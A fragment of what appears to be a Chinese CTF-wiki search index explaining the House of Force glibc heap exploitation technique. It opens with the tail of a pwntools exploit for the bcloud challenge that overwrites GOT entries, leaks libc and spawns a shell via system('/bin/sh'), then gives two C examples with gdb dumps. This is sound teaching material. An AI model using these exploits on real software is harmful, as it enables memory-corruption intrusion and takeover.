topchunk point to 0x0804B0A0-8\n\n    \np\n.\nsendlineafter\n(\noption---\n,\n \n1\n)\n\n    \nnotesize_addr\n \n=\n \n0x0804B0A0\n\n    \nnotelist_addr\n \n=\n \n0x0804B120\n\n    \ntargetaddr\n \n=\n \nnotesize_addr\n \n-\n \n8\n\n    \noffset_target_top\n \n=\n \ntargetaddr\n \n-\n \ntopchunk_addr\n\n    \n# 4 for size_t, 7 for malloc_allign\n\n    \nmalloc_size\n \n=\n \noffset_target_top\n \n-\n \n4\n \n-\n \n7\n\n    \n# plus 4 because malloc(v2 + 4);\n\n    \np\n.\nsendlineafter\n(\nInput the length of the note content:\n\\n\n,\n\n                    \nstr\n(\nmalloc_size\n \n-\n \n4\n))\n\n    \n# most likely malloc_size-4\n0...\n\n    \nif\n \nmalloc_size\n \n-\n \n4\n \n \n0\n:\n\n        \np\n.\nsendlineafter\n(\nInput the content:\n\\n\n,\n \n)\n\n\n    \n#gdb.attach(p)\n\n    \n# set notesize[0] = notesize[1] = notesize[2]=16\n\n    \n# set notelist[0] = free@got, notelist[1]= notelist[2]=atoi@got\n\n    \np\n.\nsendlineafter\n(\noption---\n,\n \n1\n)\n\n    \np\n.\nsendlineafter\n(\nInput the length of the note content:\n\\n\n,\n \nstr\n(\n1000\n))\n\n\n    \npayload\n \n=\n \np32\n(\n16\n)\n \n*\n \n3\n \n+\n \n(\nnotelist_addr\n \n-\n \nnotesize_addr\n \n-\n \n12\n)\n \n*\n \na\n \n+\n \np32\n(\n\n        \nbcloud\n.\ngot\n[\nfree\n])\n \n+\n \np32\n(\nbcloud\n.\ngot\n[\natoi\n])\n \n*\n \n2\n\n    \np\n.\nsendlineafter\n(\nInput the content:\n\\n\n,\n \npayload\n)\n\n\n    \n# overwrite free@got with puts@plt\n\n    \np\n.\nsendlineafter\n(\noption---\n,\n \n3\n)\n\n    \np\n.\nsendlineafter\n(\nInput the id:\n\\n\n,\n \nstr\n(\n0\n))\n\n    \np\n.\nsendlineafter\n(\nInput the new content:\n\\n\n,\n \np32\n(\nbcloud\n.\nplt\n[\nputs\n]))\n\n\n    \n# leak atoi addr by fake free\n\n    \np\n.\nsendlineafter\n(\noption---\n,\n \n4\n)\n\n    \np\n.\nsendlineafter\n(\nInput the id:\n\\n\n,\n \nstr\n(\n1\n))\n\n    \natoi_addr\n \n=\n \nu32\n(\np\n.\nrecv\n(\n4\n))\n\n    \nlibc_base\n \n=\n \natoi_addr\n \n-\n \nlibc\n.\nsymbols\n[\natoi\n]\n\n    \nsystem_addr\n \n=\n \nlibc_base\n \n+\n \nlibc\n.\nsymbols\n[\nsystem\n]\n\n    \nlog\n.\nsuccess\n(\nlibc base addr: \n \n+\n \nhex\n(\nlibc_base\n))\n\n\n    \n# overwrite atoi@got with system\n\n    \np\n.\nsendlineafter\n(\noption---\n,\n \n3\n)\n\n    \np\n.\nsendlineafter\n(\nInput the id:\n\\n\n,\n \nstr\n(\n2\n))\n\n    \np\n.\nsendlineafter\n(\nInput the new content:\n\\n\n,\n \np32\n(\nsystem_addr\n))\n\n\n    \n# get shell\n\n    \np\n.\nsendlineafter\n(\noption---\n,\n \n/bin/sh\n\\x00\n)\n\n    \np\n.\ninteractive\n()\n\n\n\n\nif\n \n__name__\n \n==\n \n__main__\n:\n\n    \nexp\n()\n\n\n\n\n\n\u9898\u76ee\n\n\n\n\n2016 Boston Key Party CTF cookbook", 
            "title": "House Of Force"
        }, 
        {
            "location": "/pwn/heap/house_of_force/#house-of-force", 
            "text": "", 
            "title": "House Of Force"
        }, 
        {
            "location": "/pwn/heap/house_of_force/#_1", 
            "text": "House Of Force \u5c5e\u4e8e House Of XXX \u7cfb\u5217\u7684\u5229\u7528\u65b9\u6cd5\uff0cHouse Of XXX \u662f 2004 \u5e74\u300aThe Malloc Maleficarum-Glibc Malloc Exploitation Techniques\u300b\u4e2d\u63d0\u51fa\u7684\u4e00\u7cfb\u5217\u9488\u5bf9 glibc \u5806\u5206\u914d\u5668\u7684\u5229\u7528\u65b9\u6cd5\u3002\n\u4f46\u662f\uff0c\u7531\u4e8e\u5e74\u4ee3\u4e45\u8fdc\u300aThe Malloc Maleficarum\u300b\u4e2d\u63d0\u51fa\u7684\u5927\u591a\u6570\u65b9\u6cd5\u4eca\u5929\u90fd\u4e0d\u80fd\u594f\u6548\uff0c\u6211\u4eec\u73b0\u5728\u6240\u6307\u7684 House Of XXX \u5229\u7528\u76f8\u6bd4 2004 \u5e74\u6587\u7ae0\u4e2d\u5199\u7684\u5df2\u6709\u8f83\u5927\u7684\u4e0d\u540c\u3002\u4f46\u662f\u300aThe Malloc Maleficarum\u300b\u4f9d\u7136\u662f\u4e00\u7bc7\u63a8\u8350\u9605\u8bfb\u7684\u6587\u7ae0\uff0c\u4f60\u53ef\u4ee5\u5728\u8fd9\u91cc\u8bfb\u5230\u5b83\u7684\u539f\u6587\uff1a https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/heap/house_of_force/#_2", 
            "text": "House Of Force \u662f\u4e00\u79cd\u5806\u5229\u7528\u65b9\u6cd5\uff0c\u4f46\u662f\u5e76\u4e0d\u662f\u8bf4 House Of Force \u5fc5\u987b\u5f97\u57fa\u4e8e\u5806\u6f0f\u6d1e\u6765\u8fdb\u884c\u5229\u7528\u3002\u5982\u679c\u4e00\u4e2a\u5806(heap based) \u6f0f\u6d1e\u60f3\u8981\u901a\u8fc7 House Of Force \u65b9\u6cd5\u8fdb\u884c\u5229\u7528\uff0c\u9700\u8981\u4ee5\u4e0b\u6761\u4ef6\uff1a   \u80fd\u591f\u4ee5\u6ea2\u51fa\u7b49\u65b9\u5f0f\u63a7\u5236\u5230 top chunk \u7684 size \u57df  \u80fd\u591f\u81ea\u7531\u5730\u63a7\u5236\u5806\u5206\u914d\u5c3a\u5bf8\u7684\u5927\u5c0f   House Of Force \u4ea7\u751f\u7684\u539f\u56e0\u5728\u4e8e glibc \u5bf9 top chunk \u7684\u5904\u7406\uff0c\u6839\u636e\u524d\u9762\u5806\u6570\u636e\u7ed3\u6784\u90e8\u5206\u7684\u77e5\u8bc6\u6211\u4eec\u5f97\u77e5\uff0c\u8fdb\u884c\u5806\u5206\u914d\u65f6\uff0c\u5982\u679c\u6240\u6709\u7a7a\u95f2\u7684\u5757\u90fd\u65e0\u6cd5\u6ee1\u8db3\u9700\u6c42\uff0c\u90a3\u4e48\u5c31\u4f1a\u4ece top chunk \u4e2d\u5206\u5272\u51fa\u76f8\u5e94\u7684\u5927\u5c0f\u4f5c\u4e3a\u5806\u5757\u7684\u7a7a\u95f4\u3002  \u90a3\u4e48\uff0c\u5f53\u4f7f\u7528 top chunk \u5206\u914d\u5806\u5757\u7684 size \u503c\u662f\u7531\u7528\u6237\u63a7\u5236\u7684\u4efb\u610f\u503c\u65f6\u4f1a\u53d1\u751f\u4ec0\u4e48\uff1f\u7b54\u6848\u662f\uff0c\u53ef\u4ee5\u4f7f\u5f97 top chunk\u6307\u5411\u6211\u4eec\u671f\u671b\u7684\u4efb\u4f55\u4f4d\u7f6e\uff0c\u8fd9\u5c31\u76f8\u5f53\u4e8e\u4e00\u6b21\u4efb\u610f\u5730\u5740\u5199\u3002\u7136\u800c\u5728 glibc \u4e2d\uff0c\u4f1a\u5bf9\u7528\u6237\u8bf7\u6c42\u7684\u5927\u5c0f\u548c top chunk \u73b0\u6709\u7684 size \u8fdb\u884c\u9a8c\u8bc1 // \u83b7\u53d6\u5f53\u524d\u7684top chunk\uff0c\u5e76\u8ba1\u7b97\u5176\u5bf9\u5e94\u7684\u5927\u5c0f\nvictim = av- top;\nsize   = chunksize(victim);\n// \u5982\u679c\u5728\u5206\u5272\u4e4b\u540e\uff0c\u5176\u5927\u5c0f\u4ecd\u7136\u6ee1\u8db3 chunk \u7684\u6700\u5c0f\u5927\u5c0f\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5206\u5272\u3002\nif ((unsigned long) (size)  = (unsigned long) (nb + MINSIZE)) \n{\n    remainder_size = size - nb;\n    remainder      = chunk_at_offset(victim, nb);\n    av- top        = remainder;\n    set_head(victim, nb | PREV_INUSE |\n            (av !=  main_arena ? NON_MAIN_ARENA : 0));\n    set_head(remainder, remainder_size | PREV_INUSE);\n\n    check_malloced_chunk(av, victim, nb);\n    void *p = chunk2mem(victim);\n    alloc_perturb(p, bytes);\n    return p;\n} \n\u7136\u800c\uff0c\u5982\u679c\u53ef\u4ee5\u7be1\u6539 size \u4e3a\u4e00\u4e2a\u5f88\u5927\u503c\uff0c\u5c31\u53ef\u4ee5\u8f7b\u677e\u7684\u901a\u8fc7\u8fd9\u4e2a\u9a8c\u8bc1\uff0c\u8fd9\u4e5f\u5c31\u662f\u6211\u4eec\u524d\u9762\u8bf4\u7684\u9700\u8981\u4e00\u4e2a\u80fd\u591f\u63a7\u5236top chunk size \u57df\u7684\u6f0f\u6d1e\u3002  (unsigned long) (size)  = (unsigned long) (nb + MINSIZE) \n\u4e00\u822c\u7684\u505a\u6cd5\u662f\u628a top chunk \u7684 size \u6539\u4e3a-1\uff0c\u56e0\u4e3a\u5728\u8fdb\u884c\u6bd4\u8f83\u65f6\u4f1a\u628a size \u8f6c\u6362\u6210\u65e0\u7b26\u53f7\u6570\uff0c\u56e0\u6b64 -1 \u4e5f\u5c31\u662f\u8bf4unsigned long \u4e2d\u6700\u5927\u7684\u6570\uff0c\u6240\u4ee5\u65e0\u8bba\u5982\u4f55\u90fd\u53ef\u4ee5\u901a\u8fc7\u9a8c\u8bc1\u3002  remainder      = chunk_at_offset(victim, nb);\nav- top        = remainder;\n\n/* Treat space at ptr + offset as a chunk */\n#define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s))) \n\u4e4b\u540e\u8fd9\u91cc\u4f1a\u628a top \u6307\u9488\u66f4\u65b0\uff0c\u63a5\u4e0b\u6765\u7684\u5806\u5757\u5c31\u4f1a\u5206\u914d\u5230\u8fd9\u4e2a\u4f4d\u7f6e\uff0c\u7528\u6237\u53ea\u8981\u63a7\u5236\u4e86\u8fd9\u4e2a\u6307\u9488\u5c31\u76f8\u5f53\u4e8e\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\u4efb\u610f\u503c(write-anything-anywhere)\u3002  \u4e0e\u6b64\u540c\u65f6\uff0c\u6211\u4eec\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0ctopchunk\u7684size\u4e5f\u4f1a\u66f4\u65b0\uff0c\u5176\u66f4\u65b0\u7684\u65b9\u6cd5\u5982\u4e0b  victim   =   av - top ;  size     =   chunksize ( victim );  remainder_size   =   size   -   nb ;  set_head ( remainder ,   remainder_size   |   PREV_INUSE );   \u6240\u4ee5\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u4e0b\u6b21\u5728\u6307\u5b9a\u4f4d\u7f6e\u5206\u914d\u5927\u5c0f\u4e3a x \u7684 chunk\uff0c\u6211\u4eec\u9700\u8981\u786e\u4fdd remainder_size \u4e0d\u5c0f\u4e8e x+ MINSIZE\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/heap/house_of_force/#1", 
            "text": "\u5728\u5b66\u4e60\u5b8c HOF \u7684\u539f\u7406\u4e4b\u540e\uff0c\u6211\u4eec\u8fd9\u91cc\u901a\u8fc7\u4e00\u4e2a\u793a\u4f8b\u6765\u8bf4\u660e HOF \u7684\u5229\u7528\uff0c\u8fd9\u4e2a\u4f8b\u5b50\u7684\u76ee\u6807\u662f\u901a\u8fc7HOF\u6765\u7be1\u6539  malloc@got.plt  \u5b9e\u73b0\u52ab\u6301\u7a0b\u5e8f\u6d41\u7a0b  int main()\n{\n    long *ptr,*ptr2;\n    ptr=malloc(0x10);\n    ptr=(long *)(((long)ptr)+24);\n    *ptr=-1;        //  === \u8fd9\u91cc\u628atop chunk\u7684size\u57df\u6539\u4e3a0xffffffffffffffff\n    malloc(-4120);  //  === \u51cf\u5c0ftop chunk\u6307\u9488\n    malloc(0x10);   //  === \u5206\u914d\u5757\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\n}  \u9996\u5148\uff0c\u6211\u4eec\u5206\u914d\u4e00\u4e2a 0x10 \u5b57\u8282\u5927\u5c0f\u7684\u5757  0x602000:   0x0000000000000000  0x0000000000000021  === ptr\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000020fe1  === top chunk\n0x602030:   0x0000000000000000  0x0000000000000000 \n\u4e4b\u540e\u628a top chunk \u7684 size \u6539\u4e3a 0xffffffffffffffff\uff0c\u5728\u771f\u6b63\u7684\u9898\u76ee\u4e2d\uff0c\u8fd9\u4e00\u6b65\u53ef\u4ee5\u901a\u8fc7\u5806\u6ea2\u51fa\u7b49\u6f0f\u6d1e\u6765\u5b9e\u73b0\u3002\n\u56e0\u4e3a -1 \u5728\u8865\u7801\u4e2d\u662f\u4ee5 0xffffffffffffffff \u8868\u793a\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u8d4b\u503c -1 \u5c31\u53ef\u4ee5\u3002  0x602000:   0x0000000000000000  0x0000000000000021  === ptr\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0xffffffffffffffff  === top chunk size\u57df\u88ab\u66f4\u6539\n0x602030:   0x0000000000000000  0x0000000000000000 \n\u6ce8\u610f\u6b64\u65f6\u7684 top chunk \u4f4d\u7f6e\uff0c\u5f53\u6211\u4eec\u8fdb\u884c\u4e0b\u4e00\u6b21\u5206\u914d\u7684\u65f6\u5019\u5c31\u4f1a\u66f4\u6539 top chunk \u7684\u4f4d\u7f6e\u5230\u6211\u4eec\u60f3\u8981\u7684\u5730\u65b9  0x7ffff7dd1b20  main_arena :    0x0000000100000000  0x0000000000000000\n0x7ffff7dd1b30  main_arena+16 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b40  main_arena+32 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b50  main_arena+48 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b60  main_arena+64 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b70  main_arena+80 : 0x0000000000000000  0x0000000000602020  === top chunk\u6b64\u65f6\u4e00\u5207\u6b63\u5e38\n0x7ffff7dd1b80  main_arena+96 : 0x0000000000000000  0x00007ffff7dd1b78 \n\u63a5\u4e0b\u6765\u6211\u4eec\u6267\u884c malloc(-4120); \uff0c-4120\u662f\u600e\u4e48\u5f97\u51fa\u7684\u5462\uff1f\n\u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u660e\u786e\u8981\u5199\u5165\u7684\u76ee\u7684\u5730\u5740\uff0c\u8fd9\u91cc\u6211\u7f16\u8bd1\u7a0b\u5e8f\u540e\uff0c0x601020 \u662f  malloc@got.plt  \u7684\u5730\u5740  0x601020:   0x00007ffff7a91130  === malloc@got.plt \n\u6240\u4ee5\u6211\u4eec\u5e94\u8be5\u5c06 top chunk \u6307\u5411 0x601010 \u5904\uff0c\u8fd9\u6837\u5f53\u4e0b\u6b21\u518d\u5206\u914d chunk \u65f6\uff0c\u5c31\u53ef\u4ee5\u5206\u914d\u5230  malloc@got.plt  \u5904\u7684\u5185\u5b58\u4e86\u3002  \u4e4b\u540e\u660e\u786e\u5f53\u524d top chunk \u7684\u5730\u5740\uff0c\u6839\u636e\u524d\u9762\u63cf\u8ff0\uff0ctop chunk \u4f4d\u4e8e 0x602020\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u8ba1\u7b97\u504f\u79fb\u5982\u4e0b  0x601010-0x602020=-4112  \u6b64\u5916\uff0c\u7528\u6237\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\uff0c\u4e00\u65e6\u8fdb\u5165\u7533\u8bf7\u5185\u5b58\u7684\u51fd\u6570\u4e2d\u5c31\u53d8\u6210\u4e86\u65e0\u7b26\u53f7\u6574\u6570\u3002  void   * __libc_malloc ( size_t   bytes )   {   \u5982\u679c\u60f3\u8981\u7528\u6237\u8f93\u5165\u7684\u5927\u5c0f\u7ecf\u8fc7\u5185\u90e8\u7684  checked_request2size \u53ef\u4ee5\u5f97\u5230\u8fd9\u6837\u7684\u5927\u5c0f\uff0c\u5373  /*     Check if a request is so large that it would wrap around zero when     padded and aligned. To simplify some other code, the bound is made     low enough so that adding MINSIZE will also not wrap around zero.   */  #define REQUEST_OUT_OF_RANGE(req)                                              \\      ((unsigned long) (req)  = (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))  /* pad request bytes into a usable size -- internal version */  //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1  #define request2size(req)                                                      \\      (((req) + SIZE_SZ + MALLOC_ALIGN_MASK   MINSIZE)                           \\           ? MINSIZE                                                             \\           : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK)   ~MALLOC_ALIGN_MASK)  /*  Same, except also perform argument check */  #define checked_request2size(req, sz)                                          \\      if (REQUEST_OUT_OF_RANGE(req)) {                                           \\          __set_errno(ENOMEM);                                                   \\          return 0;                                                              \\      }                                                                          \\      (sz) = request2size(req);   \u4e00\u65b9\u9762\uff0c\u6211\u4eec\u9700\u8981\u7ed5\u8fc7 REQUEST_OUT_OF_RANGE(req) \u8fd9\u4e2a\u68c0\u6d4b\uff0c\u5373\u6211\u4eec\u4f20\u7ed9 malloc \u7684\u503c\u5728\u8d1f\u6570\u8303\u56f4\u5185\uff0c\u4e0d\u5f97\u5927\u4e8e -2 * MINSIZE\uff0c\u8fd9\u4e2a\u4e00\u822c\u60c5\u51b5\u4e0b\u90fd\u662f\u53ef\u4ee5\u6ee1\u8db3\u7684\u3002  \u53e6\u4e00\u65b9\u9762\uff0c\u5728\u6ee1\u8db3\u5bf9\u5e94\u7684\u7ea6\u675f\u540e\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u5f97  request2size \u6b63\u597d\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u5927\u5c0f\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u5f97 ((req) + SIZE_SZ + MALLOC_ALIGN_MASK)   ~MALLOC_ALIGN_MASK \u6070\u597d\u4e3a-4112\u3002\u9996\u5148\uff0c\u5f88\u663e\u7136\uff0c-4112 \u662f chunk \u5bf9\u9f50\u7684\uff0c\u90a3\u4e48\u6211\u4eec\u53ea\u9700\u8981\u5c06\u5176\u5206\u522b\u51cf\u53bb SIZE_SZ\uff0cMALLOC_ALIGN_MASK \u5c31\u53ef\u4ee5\u5f97\u5230\u5bf9\u5e94\u7684\u9700\u8981\u7533\u8bf7\u7684\u503c\u3002\u5176\u5b9e\u6211\u4eec\u8fd9\u91cc\u53ea\u9700\u8981\u51cf SIZE_SZ \u5c31\u53ef\u4ee5\u4e86\uff0c\u56e0\u4e3a\u591a\u51cf\u7684 MALLOC_ALIGN_MASK \u6700\u540e\u8fd8\u4f1a\u88ab\u5bf9\u9f50\u6389\u3002\u800c \u5982\u679c -4112 \u4e0d\u662f MALLOC_ALIGN \u7684\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u9700\u8981\u591a\u51cf\u4e00\u4e9b\u4e86\u3002\u5f53\u7136\uff0c\u6211\u4eec\u6700\u597d\u4f7f\u5f97\u5206\u914d\u4e4b\u540e\u5f97\u5230\u7684 chunk \u4e5f\u662f\u5bf9\u9f50\u7684\uff0c\u56e0\u4e3a\u5728\u91ca\u653e\u4e00\u4e2a chunk \u7684\u65f6\u5019\uff0c\u4f1a\u8fdb\u884c\u5bf9\u9f50\u68c0\u67e5\u3002  \u56e0\u6b64\uff0c\u6211\u4eec\u5f53\u8c03\u7528 malloc(-4120) \u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u89c2\u5bdf\u5230 top chunk \u88ab\u62ac\u9ad8\u5230\u6211\u4eec\u60f3\u8981\u7684\u4f4d\u7f6e  0x7ffff7dd1b20  main_arena :\\   0x0000000100000000  0x0000000000000000\n0x7ffff7dd1b30  main_arena+16 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b40  main_arena+32 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b50  main_arena+48 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b60  main_arena+64 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b70  main_arena+80 : 0x0000000000000000  0x0000000000601010  === \u53ef\u4ee5\u89c2\u5bdf\u5230top chunk\u88ab\u62ac\u9ad8\n0x7ffff7dd1b80  main_arena+96 : 0x0000000000000000  0x00007ffff7dd1b78 \n\u4e4b\u540e\uff0c\u6211\u4eec\u5206\u914d\u7684\u5757\u5c31\u4f1a\u51fa\u73b0\u5728 0x601010+0x10 \u7684\u4f4d\u7f6e\uff0c\u4e5f\u5c31\u662f 0x601020 \u53ef\u4ee5\u66f4\u6539 got \u8868\u4e2d\u7684\u5185\u5bb9\u4e86\u3002  \u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u88ab\u62ac\u9ad8\u7684\u540c\u65f6\uff0cmalloc@got \u9644\u8fd1\u7684\u5185\u5bb9\u4e5f\u4f1a\u88ab\u4fee\u6539\u3002       set_head ( victim ,   nb   |   PREV_INUSE   | \n             ( av   !=   main_arena   ?   NON_MAIN_ARENA   :   0 ));", 
            "title": "\u7b80\u5355\u793a\u4f8b1"
        }, 
        {
            "location": "/pwn/heap/house_of_force/#2", 
            "text": "\u5728\u4e0a\u4e00\u4e2a\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u6f14\u793a\u4e86\u901a\u8fc7 HOF \u4f7f\u5f97 top chunk \u7684\u6307\u9488\u51cf\u5c0f\u6765\u4fee\u6539\u4f4d\u4e8e\u5176\u4e0a\u9762(\u4f4e\u5730\u5740)\u7684got\u8868\u4e2d\u7684\u5185\u5bb9\uff0c\n\u4f46\u662f HOF \u5176\u5b9e\u4e5f\u53ef\u4ee5\u4f7f\u5f97 top chunk \u6307\u9488\u589e\u5927\u6765\u4fee\u6539\u4f4d\u4e8e\u9ad8\u5730\u5740\u7a7a\u95f4\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u901a\u8fc7\u8fd9\u4e2a\u793a\u4f8b\u6765\u6f14\u793a\u8fd9\u4e00\u70b9  int main()\n{\n    long *ptr,*ptr2;\n    ptr=malloc(0x10);\n    ptr=(long *)(((long)ptr)+24);\n    *ptr=-1;                  === \u4fee\u6539top chunk size\n    malloc(140737345551056);  === \u589e\u5927top chunk\u6307\u9488\n    malloc(0x10);\n} \n\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u7a0b\u5e8f\u4ee3\u7801\u4e0e\u7b80\u5355\u793a\u4f8b1\u57fa\u672c\u76f8\u540c\uff0c\u9664\u4e86\u7b2c\u4e8c\u6b21 malloc \u7684 size \u6709\u6240\u4e0d\u540c\u3002\n\u8fd9\u6b21\u6211\u4eec\u7684\u76ee\u6807\u662f malloc_hook\uff0c\u6211\u4eec\u77e5\u9053 malloc_hook \u662f\u4f4d\u4e8e libc.so \u91cc\u7684\u5168\u5c40\u53d8\u91cf\u503c\uff0c\u9996\u5148\u67e5\u770b\u5185\u5b58\u5e03\u5c40  Start              End                Offset             Perm Path\n0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/\u684c\u9762/tst/t1\n0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/\u684c\u9762/tst/t1\n0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/\u684c\u9762/tst/t1\n0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]\n0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- \n0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- \n0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- \n0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]\n0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]\n0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- \n0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]\n0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall] \n\u53ef\u4ee5\u770b\u5230 heap \u7684\u57fa\u5740\u5728 0x602000\uff0c\u800c libc \u7684\u57fa\u5740\u5728 0x7ffff7a0d000\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u901a\u8fc7 HOF \u6269\u5927 top chunk\u6307\u9488\u7684\u503c\u6765\u5b9e\u73b0\u5bf9 malloc_hook \u7684\u5199\u3002\n\u9996\u5148\uff0c\u7531\u8c03\u8bd5\u5f97\u77e5 __malloc_hook \u7684\u5730\u5740\u4f4d\u4e8e 0x7ffff7dd1b10 \uff0c\u91c7\u53d6\u8ba1\u7b97  0x7ffff7dd1b00-0x602020-0x10=140737345551056\n\u7ecf\u8fc7\u8fd9\u6b21 malloc \u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u89c2\u5bdf\u5230 top chunk \u7684\u5730\u5740\u88ab\u62ac\u9ad8\u5230\u4e86 0x00007ffff7dd1b00  0x7ffff7dd1b20  main_arena :    0x0000000100000000  0x0000000000000000\n0x7ffff7dd1b30  main_arena+16 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b40  main_arena+32 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b50  main_arena+48 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b60  main_arena+64 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b70  main_arena+80 : 0x0000000000000000  0x00007ffff7dd1b00  === top chunk\n0x7ffff7dd1b80  main_arena+96 : 0x0000000000000000  0x00007ffff7dd1b78 \n\u4e4b\u540e\uff0c\u6211\u4eec\u53ea\u8981\u518d\u6b21\u5206\u914d\u5c31\u53ef\u4ee5\u63a7\u5236 0x7ffff7dd1b10 \u5904\u7684 __malloc_hook \u503c\u4e86  rax = 0x00007ffff7dd1b10\n\n0x400562  main+60         mov    edi, 0x10\n0x400567  main+65         call   0x400410  malloc@plt", 
            "title": "\u7b80\u5355\u793a\u4f8b2"
        }, 
        {
            "location": "/pwn/heap/house_of_force/#_3", 
            "text": "\u5728\u8fd9\u4e00\u8282\u4e2d\u8bb2\u89e3\u4e86 House Of Force \u7684\u539f\u7406\u5e76\u4e14\u7ed9\u51fa\u4e86\u4e24\u4e2a\u5229\u7528\u7684\u7b80\u5355\u793a\u4f8b\uff0c\u901a\u8fc7\u89c2\u5bdf\u8fd9\u4e24\u4e2a\u7b80\u5355\u793a\u4f8b\u6211\u4eec\u4f1a\u53d1\u73b0\u5176\u5b9eHOF\u7684\u5229\u7528\u8981\u6c42\u8fd8\u662f\u76f8\u5f53\u82db\u523b\u7684\u3002   \u9996\u5148\uff0c\u9700\u8981\u5b58\u5728\u6f0f\u6d1e\u4f7f\u5f97\u7528\u6237\u80fd\u591f\u63a7\u5236 top chunk \u7684 size \u57df\u3002  \u5176\u6b21\uff0c \u9700\u8981\u7528\u6237\u80fd\u81ea\u7531\u63a7\u5236 malloc \u7684\u5206\u914d\u5927\u5c0f  \u7b2c\u4e09\uff0c\u5206\u914d\u7684\u6b21\u6570\u4e0d\u80fd\u53d7\u9650\u5236   \u5176\u5b9e\u8fd9\u4e09\u70b9\u4e2d\u7b2c\u4e8c\u70b9\u5f80\u5f80\u662f\u6700\u96be\u529e\u7684\uff0cCTF \u9898\u76ee\u4e2d\u5f80\u5f80\u4f1a\u7ed9\u7528\u6237\u5206\u914d\u5806\u5757\u7684\u5927\u5c0f\u9650\u5236\u6700\u5c0f\u548c\u6700\u5927\u503c\u4f7f\u5f97\u4e0d\u80fd\u901a\u8fc7HOF \u7684\u65b9\u6cd5\u8fdb\u884c\u5229\u7528\u3002", 
            "title": "\u5c0f\u603b\u7ed3"
        }, 
        {
            "location": "/pwn/heap/house_of_force/#hitcon-training-lab-11", 
            "text": "\u8fd9\u91cc\uff0c\u6211\u4eec\u4e3b\u8981\u4fee\u6539\u5176 magic \u51fd\u6570\u4e3a", 
            "title": "HITCON training lab 11"
        }, 
        {
            "location": "/pwn/heap/house_of_force/#_4", 
